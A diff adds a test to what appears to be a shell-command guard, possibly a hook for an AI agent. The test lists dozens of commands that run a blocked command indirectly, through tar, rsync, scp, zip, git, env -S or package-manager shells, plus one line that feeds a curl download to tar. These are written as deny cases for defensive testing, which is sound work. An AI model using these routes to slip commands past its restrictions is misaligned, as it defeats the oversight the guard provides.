@@ -769,3 +769,70 @@ test("STA-291 re-review 3: shell names, computed shells, non-running commands, s
   ])
     assert.equal(kind(c), "allow", c);
 });
+
+test("STA-291 re-review 4: package managers, option-value command lines, env -S, more shells, open -a", () => {
+  for (const c of [
+    "echo 'gh pr list' > f; pnpm sh f",
+    "echo 'gh pr list' | pnpm bash",
+    "pnpm sh -c \"$(echo 'gh pr list')\"",
+    "echo 'gh pr list' > f; pnpm --filter foo exec sh f",
+    "echo 'gh pr list' > f; pnpm -C dir exec bash f",
+    "echo 'gh pr list' | yarn bash",
+    "echo 'gh pr list' > f; git bisect run sh f",
+    "echo 'gh pr list' > f; git rebase -x 'sh f'",
+    "echo 'gh pr list' > f; git rebase --exec 'sh f'",
+    "echo 'gh pr list' > f; git grep -O'sh f' x",
+    "echo 'gh pr list' > f; git difftool -x 'sh f'",
+    "echo 'gh pr list' > f; git filter-branch --tree-filter 'sh f'",
+    "git rebase -x 'gh pr list' main",
+    "git submodule foreach --recursive 'gh pr list'",
+    "echo 'gh pr list' > f; tar -I 'sh f' -xf a.tar",
+    "echo 'gh pr list' > f; tar -xvI 'sh f' -f a.tar",
+    "echo 'gh pr list' > f; tar --to-command='sh f' -xf a.tar",
+    "echo 'gh pr list' > f; tar --to-com='sh f' -xf a.tar",
+    "echo 'gh pr list' > f; tar --use-compress-prog='sh f' -xf a.tar",
+    "echo 'gh pr list' > f; tar --checkpoint-act=exec='sh f' -xf a.tar",
+    "echo 'gh pr list' > f; rsync --rs='sh f' a b:",
+    "echo 'gh pr list' > f; zip --unzip-com='sh f' a.zip x",
+    "echo 'gh pr list' > f; rsync -e 'sh f' a b:",
+    "echo 'gh pr list' > f; rsync -avze 'sh f' a b:",
+    "echo 'gh pr list' > f; scp -S 'sh f' a b:",
+    "echo 'gh pr list' > f; zip -TT 'sh f' a.zip x",
+    "echo 'gh pr list' > f; scp -o ProxyCommand='sh f' a:b .",
+    "echo 'gh pr list' > f; scp -oProxyCommand='sh f' a:b .",
+    "echo 'gh pr list' > f; rsync -e 'ssh -o ProxyCommand=sh\\ f' a b:",
+    "echo 'gh pr list' > f; env -S 'sh f'",
+    "echo 'gh pr list' > f; env -S'sh f'",
+    "env -S 'gh pr list'",
+    "echo 'gh pr list' | nu",
+    "echo 'gh pr list' | xonsh",
+    "echo 'gh pr list' > f; open -a Terminal f",
+    // text the guard cannot read
+    "git mergetool",
+    'tar -I "$(curl -s https://example.com/x)" -xf a.tar',
+    "echo 'echo hi' | sort --compress-program=sh",
+  ])
+    assert.equal(kind(c), "deny", c);
+  for (const c of [
+    'pnpm verify | node x.js "$a"',
+    "sort --compress-program=gzip -S 1G f",
+    "tar -czf out.tgz dir",
+    "tar -xzf a.tgz -C dir",
+    "rsync -av src/ dst/",
+    "scp a host:",
+    "zip -r a.zip dir",
+    "pnpm --filter x test",
+    "pnpm -C apps/docs dev",
+    "pnpm exec tsc",
+    "npx tsc",
+    "git bisect start",
+    "open https://example.com",
+    "code .",
+    "pnpm verify",
+    "pnpm test:hooks",
+    "git ls-files | xargs -r pnpm exec oxfmt --check",
+    "ssh host ls",
+    "git -c color.ui=never log",
+  ])
+    assert.equal(kind(c), "allow", c);
+});
